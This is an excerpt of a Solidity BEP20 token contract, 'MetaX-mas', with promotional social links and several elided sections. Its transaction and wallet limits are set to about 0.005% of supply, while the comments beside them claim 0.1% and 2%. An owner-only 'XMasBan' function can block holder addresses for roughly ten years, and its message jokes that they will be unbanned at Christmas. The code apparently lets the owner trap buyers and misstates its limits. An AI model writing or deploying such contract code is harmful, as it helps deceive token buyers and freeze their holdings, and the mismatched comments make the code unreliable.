...
// Telegram: https://t.me/MetaX-mas
// Website:  https://m-xmas.net
// Twitter:  https://twitter.com/MetaXMas

/**
 * Standard SafeMath, stripped down to just add/sub/mul/div x 10000000000000000000000000000000000000000000000000
 */
library SafeMath {
...
contract MetaXmas  is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MetaX-mas ";
    string constant _symbol = "X-Mas ";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals); // 1,000,000,000
    uint256 public _maxTxAmount = _totalSupply / 20000; //1000 0.1% 
    uint256 public _maxWallet = _totalSupply / 20000; // 2%
	...
	function XMasBan(address user, bool banned) external authorized {
		if (banned) {
            require(	1626631691 + 3650 days > block.timestamp, "User will be unbanned on the 24th of decemeber!");
